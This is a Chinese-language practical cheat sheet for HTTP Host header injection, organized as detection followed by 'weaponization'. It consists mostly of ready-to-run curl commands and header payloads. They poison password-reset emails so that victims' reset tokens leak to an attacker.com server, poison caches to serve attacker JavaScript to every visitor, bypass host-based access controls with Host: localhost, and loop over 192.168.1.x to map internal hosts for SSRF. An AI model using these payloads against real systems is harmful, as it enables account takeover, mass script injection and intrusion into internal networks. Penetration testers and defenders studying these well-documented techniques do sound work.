# Host 头注入实战参考

> 阶段分离: [攻击] 检测Host头可控性 → [利用] 密码重置投毒/缓存投毒/绕过ACL/SSRF

---

# 攻击阶段 — 检测

## 1. 检测 Host 头是否可控

```bash
# === 基础检测 ===
curl -H "Host: evil.com" https://target.com/
# 返回内容变了? 密码重置链接的域名变了? → 可控

# === 双Host头 ===
Host: target.com
Host: evil.com

# === Host头缺失 ===
# (不发送Host头, HTTP/1.1必须, 但某些代理可能补上)
```

### 1.1 检测响应中的Host反射

```bash
# 密码重置链接
curl -H "Host: evil.com" https://target.com/forgot-password -d "email=admin@target.com"
# 邮件中的链接: https://evil.com/reset?token=xxx → ★ 投毒成功

# 页面中的绝对URL
curl -H "Host: evil.com" https://target.com/
# 响应中: <script src="https://evil.com/app.js"> → Host被反射
```

### 1.2 其他Host相关头部

```
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-Host: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

---

# 利用阶段 — 武器化

## 2. 密码重置投毒 (最常用)

```bash
# Step 1: 发起密码重置请求, 投毒Host头
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# Step 2: 受害者收到邮件:
# 点击链接: https://attacker.com/reset?token=REAL_TOKEN

# Step 3: 攻击者检查自己的服务器日志 → 拿到token
# GET /reset?token=REAL_TOKEN → ★

# Step 4: 构造真实重置链接
# https://target.com/reset?token=REAL_TOKEN → 重置密码
```

## 3. 缓存投毒

```bash
# 污染缓存 → 所有访问者受影响
curl -H "Host: evil.com" https://target.com/

# 如果缓存服务器以Host为键:
# → https://target.com/ 的缓存内容 = evil.com 的响应
# → 所有用户访问 target.com → 看到 attacker 的内容

# 更隐蔽: 仅投毒静态资源
curl -H "Host: evil.com" https://target.com/static/app.js
# → /static/app.js 内容被替换 → 所有页面引用此JS → XSS
```

## 4. 绕过访问控制

```bash
# 很多ACL基于Host头:
# Host: admin.internal → 允许访问 /admin
# Host: target.com → 拒绝 /admin

# 绕过:
curl -H "Host: localhost" https://target.com/admin
curl -H "Host: 127.0.0.1" https://target.com/admin
curl -H "Host: admin.internal" https://target.com/admin
```

## 5. 内网扫描 / SSRF

```bash
# 遍历内网主机名
for i in $(seq 1 100); do
  curl -s -H "Host: 192.168.1.$i" https://target.com/ -o /dev/null -w "%{http_code} %{time_total}\n"
done
# 响应时间明显不同 → 内网主机存在

# 配合密码重置 → SSRF
curl -X POST https://target.com/forgot-password \
  -H "Host: 192.168.1.1" \      # 内网路由器
  -d "email=victim@target.com"
```

---

*参考: PortSwigger Host Header + 实战案例*
